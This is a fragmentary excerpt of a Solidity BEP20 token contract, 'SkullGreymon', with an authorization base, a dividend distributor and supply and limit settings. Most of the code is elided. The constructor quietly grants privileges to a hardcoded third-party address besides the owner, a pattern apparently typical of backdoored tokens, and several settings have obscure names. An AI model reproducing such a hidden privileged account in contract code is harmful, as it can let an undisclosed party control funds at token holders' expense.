...
abstract contract Auth {
    ...
    constructor(address _owner) {
        owner = _owner;
        authorizations[
    0x21E4a01bC34ce123D3F4971CF88aA03B70f6561a] = true;
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 PRWDS = IBEP20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    address REWARDS;
    IDEXRouter router;
...
contract SkullGreymon is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string private constant _name = "SkullGreymon";    
    string private constant _symbol = "SKREY";
    uint8 private constant _decimals = 9;
    
    uint256 _totalSupply = 100 * 10**9 * (10 ** _decimals);
    uint256 public _maxTxAmount = ( _totalSupply * 200) / 10000;
    uint256 public _maxWalletToken = ( _totalSupply * 300 ) / 10000;
    uint256 public mStx = ( _totalSupply * 200 ) / 10000;
    ...
    uint256 public ssf = 10;
    bool public swE = true;
    uint256 public sT = _totalSupply * 130 / 100000;
